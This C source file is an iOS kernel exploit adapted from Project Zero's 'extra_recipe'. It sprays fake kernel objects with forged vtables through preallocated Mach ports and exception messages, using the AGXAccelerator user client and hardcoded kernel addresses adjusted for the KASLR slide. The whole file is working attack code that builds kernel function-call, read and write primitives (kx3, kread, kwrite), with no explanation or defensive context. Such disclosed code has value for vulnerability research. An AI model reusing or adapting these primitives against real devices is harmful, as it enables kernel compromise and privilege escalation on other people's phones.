// This code is lifted from extra_recipe by Ian Beer of Google Project Zero:
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1004
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <pthread.h>

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_port.h>
#include <mach/mach_time.h>
#include <mach/mach_traps.h>

#include <mach/mach_voucher_types.h>
#include <mach/port.h>

#include <CoreFoundation/CoreFoundation.h>

// IOKit stuff

#define kIOMasterPortDefault MACH_PORT_NULL
#define IO_OBJECT_NULL MACH_PORT_NULL

typedef mach_port_t io_iterator_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_object_t;
typedef    char io_name_t[128];


CFMutableDictionaryRef
IOServiceMatching(const char* name );

kern_return_t
IOServiceGetMatchingServices(
                             mach_port_t masterPort,
                             CFDictionaryRef matching,
                             io_iterator_t * existing );

io_service_t
IOServiceGetMatchingService(
                            mach_port_t    masterPort,
                            CFDictionaryRef    matching);

io_object_t
IOIteratorNext(
               io_iterator_t    iterator );

kern_return_t
IOObjectGetClass(
                 io_object_t    object,
                 io_name_t    className );

kern_return_t
IOServiceOpen(
              io_service_t    service,
              task_port_t    owningTask,
              uint32_t    type,
              io_connect_t  *    connect );

kern_return_t
IOServiceClose(
               io_connect_t    connect );

kern_return_t
IOObjectRelease(
                io_object_t    object );

kern_return_t
IOConnectGetService(
                    io_connect_t    connect,
                    io_service_t  *    service );

// mach_vm protos

kern_return_t mach_vm_allocate
(
 vm_map_t target,
 mach_vm_address_t *address,
 mach_vm_size_t size,
 int flags
 );

kern_return_t mach_vm_deallocate
(
 vm_map_t target,
 mach_vm_address_t address,
 mach_vm_size_t size
 );

mach_port_t prealloc_port(int size) {
    kern_return_t err;
    mach_port_qos_t qos = {0};
    qos.prealloc = 1;
    qos.len = size;
    
    mach_port_name_t name = MACH_PORT_NULL;
    
    err = mach_port_allocate_full(mach_task_self(),
                                  MACH_PORT_RIGHT_RECEIVE,
                                  MACH_PORT_NULL,
                                  &qos,
                                  &name);
    
    if (err != KERN_SUCCESS) {
        printf("pre-allocated port allocation failed: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return (mach_port_t)name;
}


io_service_t service = MACH_PORT_NULL;

io_connect_t alloc_userclient() {
    kern_return_t err;
    if (service == MACH_PORT_NULL) {
        service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAccelerator"));
        
        if (service == IO_OBJECT_NULL){
            printf("unable to find service\n");
            return 0;
        }
    }
    
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(), 5, &conn); // AGXCommandQueue, 0xdb8
    if (err != KERN_SUCCESS){
        printf("unable to get user client connection\n");
        return 0;
    }
    
    return conn;
}

// each time we get an exception message copy the first 32 registers into this buffer
uint64_t crash_buf[32] = {0}; // use the 32 general purpose ARM64 registers

// implemented in load_regs_and_crash.s
void load_regs_and_crash(uint64_t* buf);

// (actually only 30 controlled qwords for the send)
struct thread_args {
    uint64_t buf[32];
    mach_port_t exception_port;
};

void* do_thread(void* arg) {
    struct thread_args* args = (struct thread_args*)arg;
    uint64_t buf[32];
    memcpy(buf, args->buf, sizeof(buf));
    
    kern_return_t err;
    err = thread_set_exception_ports(
                                     mach_thread_self(),
                                     EXC_MASK_ALL,
                                     args->exception_port,
                                     EXCEPTION_STATE, // we want to receive a catch_exception_raise_state message
                                     ARM_THREAD_STATE64);
    
    free(args);
    
    load_regs_and_crash(buf);
    printf("no crashy?");
    return NULL;
}

void prepare_prealloc_port(mach_port_t port) {
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int port_has_message(mach_port_t port) {
    kern_return_t err;
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer; // NULL trailer
    mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
    err = mach_port_peek(mach_task_self(),
                         port,
                         MACH_RCV_TRAILER_NULL,
                         &msg_seqno,
                         &msg_size,
                         &msg_id,
                         (mach_msg_trailer_info_t)&msg_trailer,
                         &msg_trailer_size);
    
    return (err == KERN_SUCCESS);
}

uint8_t crash_stack[0x4000];

// port needs to have a send right
void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
    struct thread_args* args = malloc(sizeof(struct thread_args));
    memset(args, 0, sizeof(struct thread_args));
    memcpy(args->buf, buf, n*8);

    args->exception_port = port;
    
    // start a new thread passing it the buffer and the exception port
    pthread_t t;
    pthread_create(&t, NULL, do_thread, (void*)args);
    
    // associate the pthread_t with the port so that we can join the correct pthread
    // when we receive the exception message and it exits:
    // kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
    //printf("set context\n");
    // wait until the message has actually been sent:
    while(!port_has_message(port)){;}
    
    thread_t thread = pthread_mach_thread_np(t);
    thread_terminate(thread); // leaks pthread structs, will destroy you eventually
}

// the returned pointer is only valid until the next call to this function
// ownership is retained by this function
uint64_t* receive_prealloc_msg(mach_port_t port) {
    uint8_t msg[1024];
    memset(msg, 0x00, sizeof(msg));
    mach_msg((mach_msg_header_t *)msg,
                               MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
                               0,
                               0x1000,
                               port,
                               0,
                               0);
    
    memcpy(crash_buf, msg, sizeof(crash_buf));
    
    return &crash_buf[0];
}

int _kx_setup = 0;
io_connect_t *_ucs = NULL;
mach_port_t *_lazy_ports = NULL;
uint64_t _kaslr_shift = 0;
uint64_t _kernel_buffer_base = 0;
io_connect_t *_uc = 0;
mach_port_t _lazy_port = 0;


static void _kx_find()
{
    uint64_t kernel_base = 0xfffffff007004000 + _kaslr_shift;
    uint64_t osserializer_serialize = 0xfffffff0075468f8 + _kaslr_shift;
    uint64_t get_metaclass = 0xfffffff007548a24 + _kaslr_shift;
    uint64_t ret = get_metaclass + 8;
    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
    volatile uint32_t feedfacf = 0;
    
    uint64_t r_obj[64];
    memset(r_obj, 0, sizeof(r_obj));
    r_obj[0] = _kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
    r_obj[1] = 0x20003;                 // refcount
    r_obj[2] = _kernel_buffer_base+0x48 - 0x18 - 8 + 0x10;                       // obj + 0x10 -> rdi (memmove dst)
    r_obj[3] = sizeof(uint32_t);                    // obj + 0x18 -> rsi (memmove src)
    r_obj[4] = osserializer_serialize;                    // obj + 0x20 -> fptr
    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
    r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
    r_obj[7] = 0x11;                     //
    r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
    
    r_obj[9] = kernel_base;
    r_obj[10] = &feedfacf;
    r_obj[11] = copyout;
    
    memmove((uint8_t *)r_obj + 0x10, r_obj, sizeof(r_obj) - 0x10);
    
    for (int i = 0; i < 1000; ++i) {
        send_prealloc_msg(_lazy_ports[i], (uint64_t *)r_obj, 30);
    }

    
    for (int i = 0; i < 1000; ++i) {
        io_service_t service;
        IOConnectGetService(_ucs[i], &service);
        if (feedfacf != 0) {
            _uc = _ucs[i];
            break;
        }
    }
    
    for (int i = 0; i < 1000; ++i) {
        receive_prealloc_msg(_lazy_ports[i]);
    }
    
    r_obj[9+2] = kernel_base + 1;
    
    int sent_count = 0;
    for (int i = 0; i < 1000; ++i) {
        send_prealloc_msg(_lazy_ports[i], (uint64_t *)r_obj, 30);
    
        io_service_t service;
        IOConnectGetService(_uc, &service);
        
        if (feedfacf != 0xfeedfacf) {
            _lazy_port = _lazy_ports[i];
            sent_count = i+1;
            break;
        }
    }
    
    for (int i = 0; i < sent_count; ++i) {
        receive_prealloc_msg(_lazy_ports[i]);
    }
}

void kx_setup(io_connect_t *ucs, mach_port_t *lazy_ports, uint64_t kaslr_shift, uint64_t kernel_buffer_base)
{
    _ucs = ucs;
    _lazy_ports = lazy_ports;
    _kaslr_shift = kaslr_shift;
    _kernel_buffer_base = kernel_buffer_base;
    
    for (int i = 0; i < 1000; ++i) {
         prepare_prealloc_port(lazy_ports[i]);
    }
    
    _kx_find();
}

void kx3(uint64_t fptr, uint64_t arg0, uint64_t arg1, uint64_t arg2) {
    uint64_t osserializer_serialize = 0xfffffff0075468f8 + _kaslr_shift;
    uint64_t get_metaclass = 0xfffffff007548a24 + _kaslr_shift;
    uint64_t ret = get_metaclass + 8;
    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
    
    uint64_t r_obj[64];
    memset(r_obj, 0, sizeof(r_obj));
    r_obj[0] = _kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
    r_obj[1] = 0x20003;                 // refcount
    r_obj[2] = _kernel_buffer_base+0x48 - 0x18 - 8 + 0x10;                       // obj + 0x10 -> rdi (memmove dst)
    r_obj[3] = arg2;                    // obj + 0x18 -> rsi (memmove src)
    r_obj[4] = osserializer_serialize;                    // obj + 0x20 -> fptr
    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
    r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
    r_obj[7] = 0x11;                     //
    r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
    
    r_obj[9] = arg0;
    r_obj[10] = arg1;
    r_obj[11] = fptr;
    
    memmove((uint8_t *)r_obj + 0x10, r_obj, sizeof(r_obj) - 0x10);
    
    send_prealloc_msg(_lazy_port, (uint64_t *)r_obj, 30);

    io_service_t service;
    IOConnectGetService(_uc, &service);
    
    receive_prealloc_msg(_lazy_port);
}

void kread(uint64_t addr, uint8_t *userspace, int n)
{
    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
    kx3(copyout, addr, userspace, n);
}

uint32_t kread32(uint64_t addr)
{
    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
    uint32_t value = 0;
    kx3(copyout, addr, (uint64_t)&value, sizeof(value));
    
    return value;
}

uint64_t kread64(uint64_t addr)
{
    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
    uint64_t value = 0;
    kx3(copyout, addr, (uint64_t)&value, sizeof(value));
    
    return value;
}

void kwrite(uint64_t addr, uint8_t *userspace, int n)
{
    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
    kx3(copyin, userspace, addr, n);
}

void kwrite32(uint64_t addr, uint32_t value)
{
    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
    kx3(copyin, &value, addr, sizeof(value));
}

void kwrite64(uint64_t addr, uint64_t value)
{
    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
    kx3(copyin, &value, addr, sizeof(value));
}
